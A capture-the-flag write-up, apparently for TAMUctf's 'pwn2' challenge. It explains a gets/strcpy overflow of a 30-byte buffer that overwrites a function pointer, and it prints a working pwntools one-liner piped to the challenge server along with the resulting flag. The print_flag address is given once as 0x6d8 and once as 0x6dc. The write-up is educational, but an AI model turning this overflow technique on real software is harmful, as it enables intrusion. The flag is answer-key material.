# Pwn2
Pwn

## Challenge 

nc pwn.tamuctf.com 4322

Difficulty: easy

[pwn2](pwn2)


## Solution

#### Understand the program

Upon disassembling the binary, we notice that it checks for a 'one' string

    ; Variables:
    ;    arg_0: int, 8
    ;    var_4: -4
    ;    var_C: -12
    ;    var_2A: -42

    // arg0 is the result from gets() and is passed from the main()
    int select_func(int arg0) {
        sub_550();              // strcpy arg0 into local buffer
        if (sub_4d0() == 0x0) { // strcmp if buffer == 'one'
            var_C = one;        // run function one
        }
        eax = (var_C)();
        return eax;
    }

Checking on the program, it kinda does as we guessed.

    # nc pwn.tamuctf.com 4322
    Which function would you like to call?
    one
    This is function one!

Now, if we inspect the binary functions, we want to return to a function called `print_flag()` which is located at `0x6d8`

    (gdb) info add print_flag
    Symbol "print_flag" is at 0x6d8 in a file compiled without debugging.

#### Finding Address

This time we are given a binary with PIE enabled. 

    # pwn checksec ./pwn2
    [*] '/FILES/pwn2'
        Arch:     i386-32-little
        RELRO:    Full RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      PIE enabled


> NX is enabled means stack is not executable. PIE means position independent executable, This means that the binary instructions itself is loaded arbitrarily in the memory. So we can't have shellcode and normal ROP over the binary.
RELRO refers to the writability of the GOT section

This means we do not have an address that can be retrieved from the static binary.

---

Even though PIE is enabled, it is noticed that everytime it runns, the memory address is fixed.

There is a mapping for the start address of the functions at `0x56555000`

    (gdb) info proc mappings
    process 59831
    Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /FILES/pwn2
        0x56556000 0x56557000     0x1000        0x0 /FILES/pwn2
        0x56557000 0x56558000     0x1000     0x1000 /FILES/pwn2
        0x56558000 0x5657a000    0x22000        0x0 [heap]

So we can simply calculate the address of `print_flag()`

    print_flag() = 0x6dc + 0x56555000

In order to craft the payload, we need to know the char counts to fill the buffer. Refer back to source code

    ; Variables:
    ;    arg_0: int, 8
    ;    var_4: -4
    ;    var_C: -12
    ;    var_2A: -42

    // arg0 is the result from gets() and is passed from the main()
    int select_func(int arg0) {
        sub_550();              // strcpy arg0 into local buffer of var_2A
        if (sub_4d0() == 0x0) { // strcmp if buffer == 'one'
            var_C = one;        // run function one
        }
        eax = (var_C)();
        return eax;
    }

> We notice that the address of `var_C` is being executed. 

> `var_C` is located directly after `var_2A` which is the input buffer.

> The input buffer is `(-12) - (-42) = 30` in length.

Final payload

    # python -c "from pwn import *; print cyclic(30) + p32(0x6dc + 0x56555000)" | nc pwn.tamuctf.com 4322
    Which function would you like to call?
    This function is still under development.
    gigem{4ll_17_74k35_15_0n3}

## Flag

    gigem{4ll_17_74k35_15_0n3}


Other References:
https://ocw.cs.pub.ro/courses/cns/labs/lab-10
https://github.com/ByteBandits/writeups/tree/master/hack.lu-ctf-2015/exploiting/Stackstuff/sudhackar
https://dilsec.com/2017/07/27/google-ctf-2017-pwnables-wiki-writeup/
https://toh.necst.it/hack.lu/2015/exploitable/StackStuff/
